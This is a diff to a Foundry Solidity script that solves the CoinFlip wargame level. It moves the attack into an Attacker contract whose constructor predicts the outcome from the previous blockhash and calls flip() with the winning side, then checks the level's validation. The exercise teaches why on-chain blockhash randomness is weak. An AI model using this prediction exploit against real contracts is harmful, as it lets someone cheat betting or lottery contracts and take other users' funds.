@@ -12,15 +12,15 @@ contract CoinFlipSolution is Script {
         address publicKey = vm.envAddress("PUBLIC_KEY");
 
         address payable instanceAddress = payable(
-            0x7AaCc5300ec7Ac58fe86645D08f21b1BEcadf99a
+            0x8FbE40B57D28d91B57079ee6A66aae98f141919c
         );
         coinFlipLevel = CoinFlip(instanceAddress);
 
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-
-        coinFlipLevel.flip(attack());
-
+        new Attacker(coinFlipLevel);
         console.log("Consecutive Wins: %s", coinFlipLevel.consecutiveWins());
+
+        vm.stopBroadcast();
 
         bool isValidated = new CoinFlipFactory().validateInstance(
             instanceAddress,
@@ -28,14 +28,16 @@ contract CoinFlipSolution is Script {
         );
         console.log("Challenge Completed: %s", isValidated);
     }
+}
 
-    function attack() internal view returns (bool) {
-        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+contract Attacker {
+    uint256 constant FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
+    constructor(CoinFlip _level) {
         uint256 blockValue = uint256(blockhash(block.number - 1));
         uint256 coinFlip = blockValue / FACTOR;
         bool side = coinFlip == 1 ? true : false;
-
-        return side;
+        _level.flip(side);
     }
 }
